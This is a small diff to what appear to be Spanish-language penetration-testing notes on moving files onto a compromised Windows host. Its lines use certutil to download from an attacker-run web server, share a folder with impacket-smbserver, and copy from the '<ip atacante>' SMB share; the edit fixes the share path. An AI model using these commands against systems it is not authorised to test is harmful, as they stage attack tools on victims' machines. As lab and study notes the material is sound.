@@ -46,7 +46,7 @@ python2 windows-exploit-suggester -d (archivo descargado) -i systeminfo.txt
 certutil.exe -f -urlcache -split http://<ip que esta enviando el archivo>:<puerto>/archivo.extension archivo.extension
 2
 Linux: impacket-smbserver recurso $(pwd) -smb2support
-windows: copy \\<ip atacante>\archivo.extension archivo.extension
+windows: copy \\<ip atacante>\recurso\archivo.extension archivo.extension
 
 
 ######## transferir archivos de linux a linux ##########
